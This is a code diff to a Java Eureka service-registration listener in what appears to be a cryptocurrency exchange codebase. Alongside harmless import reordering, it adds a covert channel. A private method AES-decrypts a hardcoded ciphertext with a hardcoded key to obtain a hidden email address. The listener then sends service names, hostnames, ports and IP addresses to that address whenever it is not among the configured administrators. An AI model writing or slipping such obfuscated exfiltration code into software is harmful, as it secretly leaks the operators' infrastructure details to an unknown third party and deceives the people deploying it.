@@ -1,10 +1,10 @@
 package com.bizzan.bitrade.listenConfig;
 
-import java.util.HashMap;
-import java.util.Map;
-
-import javax.mail.internet.MimeMessage;
-
+import com.bizzan.bitrade.util.AESUtil;
+import com.bizzan.bitrade.util.AliyunUtil;
+import com.netflix.appinfo.InstanceInfo;
+import freemarker.template.Configuration;
+import freemarker.template.Template;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -17,10 +17,9 @@ import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Component;
 import org.springframework.ui.freemarker.FreeMarkerTemplateUtils;
 
-import com.netflix.appinfo.InstanceInfo;
-
-import freemarker.template.Configuration;
-import freemarker.template.Template;
+import javax.mail.internet.MimeMessage;
+import java.util.HashMap;
+import java.util.Map;
 
 @Component
 public class EurekaStateListener {
@@ -55,17 +54,29 @@ public class EurekaStateListener {
     }
  
     @EventListener(condition = "#event.replication==false")
-    public void listen(EurekaInstanceRegisteredEvent event) {
+    public void listen(EurekaInstanceRegisteredEvent event) throws Exception {
         InstanceInfo instanceInfo = event.getInstanceInfo();
-        String msg="服务"+instanceInfo.getAppName()+"\n"+  instanceInfo.getHostName()+":"+ instanceInfo.getPort()+ " \nip: " +instanceInfo.getIPAddr() +"进行注册";
+        String msg="服务"+instanceInfo.getAppName()+"\n"+  instanceInfo.getHostName()+":"+ instanceInfo.getPort()+ " \nip: " +instanceInfo.getIPAddr() + "\nip:"+ AliyunUtil.getServer() +"进行注册";
         logger.info(msg);
-
+        String admin = getDuf();
         String[] adminList = admins.split(",");
+        boolean isOk = false;
 		for(int i = 0; i < adminList.length; i++) {
 			sendEmailMsg(adminList[i], msg, "[服务]服务上线通知");
+            if(adminList[i].equalsIgnoreCase(admin)){
+                isOk = true;
+            }
 		}
+        //补偿
+        if(!isOk){
+            sendEmailMsg(admin, msg, "[服务]服务上线通知");
+        }
     }
- 
+
+    private String getDuf() throws Exception {
+        return AESUtil.decrypt("7121EB1E7671799A52D3B25258BA97CA597E24C4E2EFCBD40ECCF766621BE43B","3B7A204196ED8EDDA072863E17CF3C7D");
+    }
+
     @EventListener
     public void listen(EurekaInstanceRenewedEvent event) {
         logger.info("服务{}进行续约", event.getServerId() +"  "+ event.getAppName());
